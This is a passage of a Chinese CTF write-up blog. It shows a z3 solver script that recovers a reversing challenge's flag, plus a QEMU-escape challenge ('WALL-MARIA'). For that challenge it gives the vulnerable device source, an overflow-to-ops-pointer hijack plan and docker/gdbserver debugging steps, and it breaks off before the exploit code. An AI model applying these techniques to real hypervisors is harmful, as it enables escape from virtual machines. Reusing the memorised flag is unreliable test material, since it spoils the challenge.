class="line"><span class="comment"># solver.add(x9 &lt;=126)</span></span><br><span class="line"><span class="comment"># solver.add(x10 &gt;=32)</span></span><br><span class="line"><span class="comment"># solver.add(x10 &lt;=126)</span></span><br><span class="line"><span class="comment"># solver.add(x11 &gt;=32)</span></span><br><span class="line"><span class="comment"># solver.add(x11 &lt;=126)</span></span><br><span class="line"><span class="comment"># solver.add(x12 &gt;=32)</span></span><br><span class="line"><span class="comment"># solver.add(x12 &lt;=126)</span></span><br><span class="line"><span class="comment"># solver.add(x13 &gt;=32)</span></span><br><span class="line"><span class="comment"># solver.add(x13 &lt;=126)</span></span><br><span class="line"><span class="comment"># solver.add(x14 &gt;=32)</span></span><br><span class="line"><span class="comment"># solver.add(x14 &lt;=126)</span></span><br><span class="line"><span class="comment"># solver.add(x15 &gt;=32)</span></span><br><span class="line"><span class="comment"># solver.add(x15 &lt;=126)</span></span><br><span class="line"><span class="comment"># solver.add(2*x10 + 5*x11 + 6*x12 - 10*x13 + 11*x14 - 3*x15 - 2*x8 + 3*x9 - 2061==0)</span></span><br><span class="line"><span class="comment"># solver.add(-3*x10 - 3*x11 + 4*x12 - 5*x13 - 2*x14 + 6*x15 - 2*x8 - 4*x9 + 510==0)</span></span><br><span class="line"><span class="comment"># solver.add(3*x10 - 5*x11 + 6*x12 - 17*x13 - 2*x14 - 7*x15 - 9*x8 - 3*x9 + 2260==0)</span></span><br><span class="line"><span class="comment"># solver.add(-x10 + 3*x11 + 6*x12 - 8*x13 + 9*x14 + 4*x15 - 2*x8 + 2*x9 - 2107 ==0)</span></span><br><span class="line"><span class="comment"># solver.add(2*x10 - 13*x11 - 5*x12 - x13 - 20*x14 - 8*x15 - 6*x8 - 7*x9 + 6124==0)</span></span><br><span class="line"><span class="comment"># solver.add(-6*x10 + x11 - 8*x12 + 22*x13 - 6*x14 + 13*x15 + 9*x8 - x9 - 878 ==0)</span></span><br><span class="line"><span class="comment"># solver.add(3*x10 - 4*x11 + 4*x12 - 13*x13 - 2*x14 - 7*x15 - 7*x8 - 2*x9 + 1960==0)</span></span><br><span class="line"><span class="comment"># solver.add(-7*x16 - 2*x17 + 3*x18 - 4*x19 + 4*x20 - 13*x21 - 2*x22 - 7*x23 + 16777216==16775299)</span></span><br><span class="line"><span class="comment"># solver.add(-2*x16 + 3*x17 + 2*x18 + 5*x19 + 6*x20 - 10*x21 + 11*x22 - 3*x23==1374)</span></span><br><span class="line"><span class="comment"># solver.add(-2*x16 - 4*x17 - 3*x18 - 3*x19 + 4*x20 - 5*x21 - 2*x22 + 6*x23+16777216==16776956)</span></span><br><span class="line"><span class="comment"># solver.add(9*x16 + 3*x17 - 3*x18 + 5*x19 - 6*x20 + 17*x21 + 2*x22 + 7*x23==2212)</span></span><br><span class="line"><span class="comment"># solver.add(-2*x16 + 2*x17 - x18 + 3*x19 + 6*x20 - 8*x21 + 9*x22 + 4*x23==1577)</span></span><br><span class="line"><span class="comment"># solver.add(6*x16 + 7*x17 - 2*x18 + 13*x19 + 5*x20 + x21 + 20*x22 + 8*x23==4993)</span></span><br><span class="line"><span class="comment"># solver.add(9*x16 - x17 - 6*x18 + x19 - 8*x20 + 22*x21 - 6*x22 + 13*x23==1351)</span></span><br><span class="line"><span class="comment"># solver.add(5*x16 - 5*x17 - 8*x18 - 6*x19 - 5*x20 + 15*x21 - 11*x22 + 15*x23+16777216==16777040)</span></span><br><span class="line"><span class="comment"># solver.add(2*x16 + 4*x17 + 3*x18 + 3*x19 - 4*x20 + 5*x21 + 2*x22 - 6*x23 -260==0)</span></span><br><span class="line">solver.add(<span class="number">-7</span>*x24 - <span class="number">2</span>*x25 + <span class="number">3</span>*x26 - <span class="number">4</span>*x27 + <span class="number">4</span>*x28 - <span class="number">13</span>*x29 - <span class="number">2</span>*x30 - <span class="number">7</span>*x31 + <span class="number">16777216</span>==<span class="number">16774665</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x24 + <span class="number">3</span>*x25 + <span class="number">2</span>*x26 + <span class="number">5</span>*x27 + <span class="number">6</span>*x28 - <span class="number">10</span>*x29 + <span class="number">11</span>*x30 - <span class="number">3</span>*x31==<span class="number">1498</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x24 - <span class="number">4</span>*x25 - <span class="number">3</span>*x26 - <span class="number">3</span>*x27 + <span class="number">4</span>*x28 - <span class="number">5</span>*x29 - <span class="number">2</span>*x30 + <span class="number">6</span>*x31+<span class="number">16777216</span>==<span class="number">16776379</span>)</span><br><span class="line">solver.add(<span class="number">9</span>*x24 + <span class="number">3</span>*x25 - <span class="number">3</span>*x26 + <span class="number">5</span>*x27 - <span class="number">6</span>*x28 + <span class="number">17</span>*x29 + <span class="number">2</span>*x30 + <span class="number">7</span>*x31==<span class="number">3062</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x24 + <span class="number">2</span>*x25 - x26 + <span class="number">3</span>*x27 + <span class="number">6</span>*x28 - <span class="number">8</span>*x29 + <span class="number">9</span>*x30 + <span class="number">4</span>*x31==<span class="number">1593</span>)</span><br><span class="line">solver.add(<span class="number">6</span>*x24 + <span class="number">7</span>*x25 - <span class="number">2</span>*x26 + <span class="number">13</span>*x27 + <span class="number">5</span>*x28 + x29 + <span class="number">20</span>*x30 + <span class="number">8</span>*x31==<span class="number">5966</span>)</span><br><span class="line">solver.add(<span class="number">9</span>*x24 - x25 - <span class="number">6</span>*x26 + x27 - <span class="number">8</span>*x28 + <span class="number">22</span>*x29 - <span class="number">6</span>*x30 + <span class="number">13</span>*x31==<span class="number">1924</span>)</span><br><span class="line">solver.add(<span class="number">5</span>*x24 - <span class="number">5</span>*x25 - <span class="number">8</span>*x26 - <span class="number">6</span>*x27 - <span class="number">5</span>*x28 + <span class="number">15</span>*x29 - <span class="number">11</span>*x30 + <span class="number">15</span>*x31+<span class="number">16777216</span>==<span class="number">16776815</span>)</span><br><span class="line"></span><br><span class="line">solver.add(<span class="number">-7</span>*x32 - <span class="number">2</span>*x33 + <span class="number">3</span>*x34 - <span class="number">4</span>*x35 + <span class="number">4</span>*x36 - <span class="number">13</span>*x37 - <span class="number">2</span>*x38 - <span class="number">7</span>*x39 + <span class="number">16777216</span>==<span class="number">16774318</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x32 + <span class="number">3</span>*x33 + <span class="number">2</span>*x34 + <span class="number">5</span>*x35 + <span class="number">6</span>*x36 - <span class="number">10</span>*x37 + <span class="number">11</span>*x38 - <span class="number">3</span>*x39==<span class="number">851</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x32 - <span class="number">4</span>*x33 - <span class="number">3</span>*x34 - <span class="number">3</span>*x35 + <span class="number">4</span>*x36 - <span class="number">5</span>*x37 - <span class="number">2</span>*x38 + <span class="number">6</span>*x39+<span class="number">16777216</span>==<span class="number">16775763</span>)</span><br><span class="line">solver.add(<span class="number">9</span>*x32 + <span class="number">3</span>*x33 - <span class="number">3</span>*x34 + <span class="number">5</span>*x35 - <span class="number">6</span>*x36 + <span class="number">17</span>*x37 + <span class="number">2</span>*x38 + <span class="number">7</span>*x39==<span class="number">3663</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x32 + <span class="number">2</span>*x33 - x34 + <span class="number">3</span>*x35 + <span class="number">6</span>*x36 - <span class="number">8</span>*x37 + <span class="number">9</span>*x38 + <span class="number">4</span>*x39==<span class="number">711</span>)</span><br><span class="line">solver.add(<span class="number">6</span>*x32 + <span class="number">7</span>*x33 - <span class="number">2</span>*x34 + <span class="number">13</span>*x35 + <span class="number">5</span>*x36 + x37 + <span class="number">20</span>*x38 + <span class="number">8</span>*x39==<span class="number">5193</span>)</span><br><span class="line">solver.add(<span class="number">9</span>*x32 - x33 - <span class="number">6</span>*x34 + x35 - <span class="number">8</span>*x36 + <span class="number">22</span>*x37 - <span class="number">6</span>*x38 + <span class="number">13</span>*x39==<span class="number">2591</span>)</span><br><span class="line">solver.add(<span class="number">5</span>*x32 - <span class="number">5</span>*x33 - <span class="number">8</span>*x34 - <span class="number">6</span>*x35 - <span class="number">5</span>*x36 + <span class="number">15</span>*x37 - <span class="number">11</span>*x38 + <span class="number">15</span>*x39+<span class="number">16777216</span>==<span class="number">16777069</span>)</span><br><span class="line"></span><br><span class="line">solver.add( <span class="number">-7</span>*x40 - <span class="number">2</span>*x41 + <span class="number">3</span>*x42 - <span class="number">4</span>*x43 + <span class="number">4</span>*x44 - <span class="number">13</span>*x45 - <span class="number">2</span>*x46 - <span class="number">7</span>*x47 + <span class="number">16777216</span>==<span class="number">16774005</span>)</span><br><span class="line">solver.add( <span class="number">-2</span>*x40 + <span class="number">3</span>*x41 + <span class="number">2</span>*x42 + <span class="number">5</span>*x43 + <span class="number">6</span>*x44 - <span class="number">10</span>*x45 + <span class="number">11</span>*x46 - <span class="number">3</span>*x47==<span class="number">1189</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x40 - <span class="number">4</span>*x41 - <span class="number">3</span>*x42 - <span class="number">3</span>*x43 + <span class="number">4</span>*x44 - <span class="number">5</span>*x45 - <span class="number">2</span>*x46 + <span class="number">6</span>*x47+<span class="number">16777216</span> ==<span class="number">16776283</span>)</span><br><span class="line">solver.add( <span class="number">9</span>*x40 + <span class="number">3</span>*x41 - <span class="number">3</span>*x42 + <span class="number">5</span>*x43 - <span class="number">6</span>*x44 + <span class="number">17</span>*x45 + <span class="number">2</span>*x46 + <span class="number">7</span>*x47==<span class="number">3892</span>)</span><br><span class="line">solver.add( <span class="number">-2</span>*x40 + <span class="number">2</span>*x41 - x42 + <span class="number">3</span>*x43 + <span class="number">6</span>*x44 - <span class="number">8</span>*x45 + <span class="number">9</span>*x46 + <span class="number">4</span>*x47==<span class="number">1372</span>)</span><br><span class="line">solver.add(<span class="number">6</span>*x40 + <span class="number">7</span>*x41 - <span class="number">2</span>*x42 + <span class="number">13</span>*x43 + <span class="number">5</span>*x44 + x45 + <span class="number">20</span>*x46 + <span class="number">8</span>*x47 ==<span class="number">6362</span>)</span><br><span class="line">solver.add(<span class="number">9</span>*x40 - x41 - <span class="number">6</span>*x42 + x43 - <span class="number">8</span>*x44 + <span class="number">22</span>*x45 - <span class="number">6</span>*x46 + <span class="number">13</span>*x47 ==<span class="number">2910</span>)</span><br><span class="line">solver.add(<span class="number">5</span>*x40 - <span class="number">5</span>*x41 - <span class="number">8</span>*x42 - <span class="number">6</span>*x43 - <span class="number">5</span>*x44 + <span class="number">15</span>*x45 - <span class="number">11</span>*x46 + <span class="number">15</span>*x47 ==<span class="number">307</span>)</span><br><span class="line"></span><br><span class="line">solver.add(<span class="number">-7</span>*x48 - <span class="number">2</span>*x49 + <span class="number">3</span>*x50 - <span class="number">4</span>*x51 + <span class="number">4</span>*x52 - <span class="number">13</span>*x53 - <span class="number">2</span>*x54 - <span class="number">7</span>*x55 + <span class="number">16777216</span>==<span class="number">16775169</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x48 + <span class="number">3</span>*x49 + <span class="number">2</span>*x50 + <span class="number">5</span>*x51 + <span class="number">6</span>*x52 - <span class="number">10</span>*x53 + <span class="number">11</span>*x54 - <span class="number">3</span>*x55==<span class="number">1031</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x48 - <span class="number">4</span>*x49 - <span class="number">3</span>*x50 - <span class="number">3</span>*x51 + <span class="number">4</span>*x52 - <span class="number">5</span>*x53 - <span class="number">2</span>*x54 + <span class="number">6</span>*x55+<span class="number">16777216</span>==<span class="number">16776798</span>)</span><br><span class="line">solver.add(<span class="number">9</span>*x48 + <span class="number">3</span>*x49 - <span class="number">3</span>*x50 + <span class="number">5</span>*x51 - <span class="number">6</span>*x52 + <span class="number">17</span>*x53 + <span class="number">2</span>*x54 + <span class="number">7</span>*x55==<span class="number">2426</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x48 + <span class="number">2</span>*x49 - x50 + <span class="number">3</span>*x51 + <span class="number">6</span>*x52 - <span class="number">8</span>*x53 + <span class="number">9</span>*x54 + <span class="number">4</span>*x55==<span class="number">1171</span>)</span><br><span class="line">solver.add(<span class="number">6</span>*x48 + <span class="number">7</span>*x49 - <span class="number">2</span>*x50 + <span class="number">13</span>*x51 + <span class="number">5</span>*x52 + x53 + <span class="number">20</span>*x54 + <span class="number">8</span>*x55==<span class="number">4570</span>)</span><br><span class="line">solver.add(<span class="number">9</span>*x48 - x49 - <span class="number">6</span>*x50 + x51 - <span class="number">8</span>*x52 + <span class="number">22</span>*x53 - <span class="number">6</span>*x54 + <span class="number">13</span>*x55==<span class="number">1728</span>)</span><br><span class="line">solver.add(<span class="number">5</span>*x48 - <span class="number">5</span>*x49 - <span class="number">8</span>*x50 - <span class="number">6</span>*x51 - <span class="number">5</span>*x52 + <span class="number">15</span>*x53 - <span class="number">11</span>*x54 + <span class="number">15</span>*x55==<span class="number">33</span>)</span><br><span class="line"></span><br><span class="line">solver.add(<span class="number">-7</span>*x56 - <span class="number">2</span>*x57 + <span class="number">3</span>*x58 - <span class="number">4</span>*x59 + <span class="number">4</span>*x60 - <span class="number">13</span>*x61 - <span class="number">2</span>*x62 - <span class="number">7</span>*x63 + <span class="number">16777216</span>==<span class="number">16775201</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x56 + <span class="number">3</span>*x57 + <span class="number">2</span>*x58 + <span class="number">5</span>*x59 + <span class="number">6</span>*x60 - <span class="number">10</span>*x61 + <span class="number">11</span>*x62 - <span class="number">3</span>*x63==<span class="number">819</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x56 - <span class="number">4</span>*x57 - <span class="number">3</span>*x58 - <span class="number">3</span>*x59 + <span class="number">4</span>*x60 - <span class="number">5</span>*x61 - <span class="number">2</span>*x62 + <span class="number">6</span>*x63+<span class="number">16777216</span>==<span class="number">16776898</span>)</span><br><span class="line">solver.add(<span class="number">9</span>*x56 + <span class="number">3</span>*x57 - <span class="number">3</span>*x58 + <span class="number">5</span>*x59 - <span class="number">6</span>*x60 + <span class="number">17</span>*x61 + <span class="number">2</span>*x62 + <span class="number">7</span>*x63==<span class="number">2370</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x56 + <span class="number">2</span>*x57 - x58 + <span class="number">3</span>*x59 + <span class="number">6</span>*x60 - <span class="number">8</span>*x61 + <span class="number">9</span>*x62 + <span class="number">4</span>*x63==<span class="number">1132</span>)</span><br><span class="line">solver.add(<span class="number">6</span>*x56 + <span class="number">7</span>*x57 - <span class="number">2</span>*x58 + <span class="number">13</span>*x59 + <span class="number">5</span>*x60 + x61 + <span class="number">20</span>*x62 + <span class="number">8</span>*x63==<span class="number">4255</span>)</span><br><span class="line">solver.add(<span class="number">9</span>*x56 - x57 - <span class="number">6</span>*x58 + x59 - <span class="number">8</span>*x60 + <span class="number">22</span>*x61 - <span class="number">6</span>*x62 + <span class="number">13</span>*x63==<span class="number">1900</span>)</span><br><span class="line">solver.add(<span class="number">5</span>*x56 - <span class="number">5</span>*x57 - <span class="number">8</span>*x58 - <span class="number">6</span>*x59 - <span class="number">5</span>*x60 + <span class="number">15</span>*x61 - <span class="number">11</span>*x62 + <span class="number">15</span>*x63==<span class="number">347</span>)</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span>(solver.check()==sat):</span><br><span class="line">    m = solver.model()</span><br><span class="line">    <span class="comment"># s = []</span></span><br><span class="line">    <span class="comment"># for i in range(8):</span></span><br><span class="line">    <span class="comment">#     s,append(m[])</span></span><br><span class="line">    <span class="comment"># for i in m:</span></span><br><span class="line">    <span class="comment">#     print(i)</span></span><br><span class="line">    <span class="comment"># for i in range(24,64):</span></span><br><span class="line">    <span class="comment">#     exec(f&quot;flag.append&#123;m[x&#123;i&#125;]&#125;&quot;)</span></span><br><span class="line">    flag.append(m[x24])</span><br><span class="line">    flag.append(m[x25])</span><br><span class="line">    flag.append(m[x26])</span><br><span class="line">    flag.append(m[x27])</span><br><span class="line">    flag.append(m[x28])</span><br><span class="line">    flag.append(m[x29])</span><br><span class="line">    flag.append(m[x30])</span><br><span class="line">    flag.append(m[x31])</span><br><span class="line">    flag.append(m[x32])</span><br><span class="line">    flag.append(m[x33])</span><br><span class="line">    flag.append(m[x34])</span><br><span class="line">    flag.append(m[x35])</span><br><span class="line">    flag.append(m[x36])</span><br><span class="line">    flag.append(m[x37])</span><br><span class="line">    flag.append(m[x38])</span><br><span class="line">    flag.append(m[x39])</span><br><span class="line">    flag.append(m[x40])</span><br><span class="line">    flag.append(m[x41])</span><br><span class="line">    flag.append(m[x42])</span><br><span class="line">    flag.append(m[x43])</span><br><span class="line">    flag.append(m[x44])</span><br><span class="line">    flag.append(m[x45])</span><br><span class="line">    flag.append(m[x46])</span><br><span class="line">    flag.append(m[x47])</span><br><span class="line">    flag.append(m[x48])</span><br><span class="line">    flag.append(m[x49])</span><br><span class="line">    flag.append(m[x50])</span><br><span class="line">    flag.append(m[x51])</span><br><span class="line">    flag.append(m[x52])</span><br><span class="line">    flag.append(m[x53])</span><br><span class="line">    flag.append(m[x54])</span><br><span class="line">    flag.append(m[x55])</span><br><span class="line">    flag.append(m[x56])</span><br><span class="line">    flag.append(m[x57])</span><br><span class="line">    flag.append(m[x58])</span><br><span class="line">    flag.append(m[x59])</span><br><span class="line">    flag.append(m[x60])</span><br><span class="line">    flag.append(m[x61])</span><br><span class="line">    flag.append(m[x62])</span><br><span class="line">    flag.append(m[x63])</span><br><span class="line">    print(flag)</span><br><span class="line">    <span class="comment"># for i in flag:</span></span><br><span class="line">    <span class="comment">#     ans += chr(i)</span></span><br><span class="line">    f = [<span class="number">55</span>, <span class="number">114</span>, <span class="number">117</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">95</span>, <span class="number">118</span>, <span class="number">109</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">65</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">48</span>, <span class="number">121</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">99</span>, <span class="number">57</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">102</span>, <span class="number">57</span>, <span class="number">56</span>, <span class="number">98</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">97</span>, <span class="number">102</span>, <span class="number">53</span>, <span class="number">49</span>, <span class="number">55</span>, <span class="number">125</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        ans += chr(i)</span><br><span class="line">    print(ans)</span><br><span class="line"><span class="comment"># print(solver.check())</span></span><br><span class="line"><span class="comment"># solver.add(5*x56 - 5*x57 - 8*x58 - 6*x59 - 5*x60 + 15*x61 - 11*x62 + 15*x63 ==0)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="WALL-MARIA"><a href="#WALL-MARIA" class="headerlink" title="WALL-MARIA"></a>WALL-MARIA</h2><p>一道qemu逃逸题，题目给了docker容器。通过这个题学到了一点东西，不过也稍微走了一点弯路，在此记录一下。</p>
<p>主要是针对docker下的一些调试技巧</p>
<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>题目给了源码，并且漏洞点非常明显</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PCIDevice pdev;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="keyword">uint64_t</span> src;</span><br><span class="line">        <span class="keyword">uint8_t</span> off;</span><br><span class="line">	&#125; state;</span><br><span class="line">    <span class="keyword">char</span> buff[BUFF_SIZE];</span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">&#125; MariaState;</span><br><span class="line"></span><br><span class="line">DECLARE_INSTANCE_CHECKER(MariaState, MARIA, TYPE_PCI_MARIA_DEVICE)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint64_t</span> <span class="title">maria_mmio_read</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr, <span class="keyword">unsigned</span> size)</span> </span>&#123;</span><br><span class="line">    MariaState *maria = (MariaState *)opaque;</span><br><span class="line">    <span class="keyword">uint64_t</span> val = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x00</span>:</span><br><span class="line">            cpu_physical_memory_rw(maria-&gt;state.src, &amp;maria-&gt;buff[maria-&gt;state.off], BUFF_SIZE, <span class="number">1</span>);</span><br><span class="line">            val = <span class="number">0x600DC0DE</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x04</span>:</span><br><span class="line">            val = maria-&gt;state.src;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x08</span>:</span><br><span class="line">            val = maria-&gt;state.off;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            val = <span class="number">0xDEADC0DE</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">maria_mmio_write</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> size)</span> </span>&#123;</span><br><span class="line">    MariaState *maria = (MariaState *)opaque;</span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x00</span>:</span><br><span class="line">            cpu_physical_memory_rw(maria-&gt;state.src, &amp;maria-&gt;buff[maria-&gt;state.off], BUFF_SIZE, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x04</span>:</span><br><span class="line">            maria-&gt;state.src = val;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x08</span>:</span><br><span class="line">            maria-&gt;state.off = val;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到<code>MariaState.state</code>的src和off都是由我们所指定的，然后通过<code>cpu_physical_memory_rw</code>我们可以往buff上面写东西或者读东西，偏移是off，大小时0x2000。显然这里有一个越界读写，off可以至多设置为0xff,也就是我们能至多越界读和写buff后面0xff大小的内容</p>
<p>所以利用思路很明显，我们只要越界写<code>MariaState</code>的<code>MemoryRegion</code>中的<code>ops</code>指针，指向我们构造的函数表，这样当我们在对应地址空间进行<code>mmio_read/mmio_write</code>的时候就能调用相应指针，进行一个控制流的劫持。需要注意的是，qemu启动脚本开了沙盒<code>-sandbox on</code>，所以我们只能通过ORW来读取flag，无法getshell(我打到最后爆了bad syscall才发现，蚌埠住了)</p>
<h3 id="调试方法"><a href="#调试方法" class="headerlink" title="调试方法"></a>调试方法</h3><p>题目给了Dockerfile。我本来想在本地进行调试的，但是因为缺少链接库的原因没跑起来，而我也不太想去配环境了，所以就尝试了一下直接调试Dockerfile里面运行的qemu进程。</p>
<p>具体可以参照如下步骤，首先在Dockerfile里面添加如下语句</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apt-get install -y --fix-missing python3 python3-pip python3-dev lib32z1 \</span></span><br><span class="line"><span class="bash">    xinetd curl gcc gdb gdbserver g++ git libssl-dev libffi-dev build-essential tmux \</span></span><br><span class="line"><span class="bash">    vim  iputils-ping cpio gdb-multiarch \</span></span><br><span class="line"><span class="bash">    file net-tools </span></span><br></pre></td></tr></table></figure>
<p>主要用到的是<code>gdbserver</code> ，构建好镜像之后直接运行镜像即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 11111:11111 -i -t d8d64ecdf778   /bin/bash</span><br></pre></td></tr></table></figure>
<p>然后我们再起一个这个容器的shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker <span class="built_in">exec</span> -it 476559b02d8a /bin/bash</span><br></pre></td></tr></table></figure>
<p>然后我们在一个shell中运行qemu启动脚本<code>./run.sh</code>，另一个shell通过查看pid利用gdbserver进行一个attach</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdbserver --attach :11111 &lt;pid&gt;</span><br></pre></td></tr></table></figure>
<p>最后在gdb中通过<code>target remote:11111</code>进行连接即可远程调试</p>
<p>在比赛中我主要用打包文件系统的方式，把exp打包进文件系统然后传到docker里面，然后docker里面再次运行qemu启动脚本，但是感觉这样很慢很慢，打包一次文件系统差不多得1min。但是感觉通过网络传输的方式也挺麻烦的，似乎还要配网(我不知道咋配的)，那就这样拉倒吧(开摆)。打包的1min就奖励自己休息一会</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -static -o exp</span><br><span class="line">mv exp ./core</span><br><span class="line"><span class="built_in">cd</span> ./core</span><br><span class="line">find . | cpio -H newc -o &gt; ../initramfs.cpio</span><br><span class="line"><span class="comment"># docker cp ../initramfs.cpio 476559b02d8a</span></span><br><span class="line">docker cp ../initramfs.cpio 476559b02d8a:/home/user/</span><br></pre></td></tr></table></figure>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>很容易想到的方法就是将src设置成我们申请一块区域的物理地址，然后通过越界读将越界内容(buff和后面的内容)读到src，然后再通过读这块区域，给泄露出来。</p>
<p>但是这里有一个问题，我们的buff占了两页内存。我们申请的区域占了两页内存，这两页内存的虚拟地址是连续的，但是物理地址并不一定连续，而且我们越界读的内容在后面，所以就会导致我们无法读出泄露的地址。</p>
<p>这里有两种解决办法，一种是通过布局src来正确读到内存，另一个方法是使用huge page，直接申请虚拟地址和物理地址都连续的两页大小的内存。</p>
<p>在比赛中我选用的是前一种方法，而官方exp给出的是后一种方法。我觉得后一种方法更有普适性,而且前一种方式容易出现一些各种各样的问题(因为实际上我们是越界写了一部分物理页，而这部分物理页谁知道要被用来干什么)</p>
<p>前一种方式如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 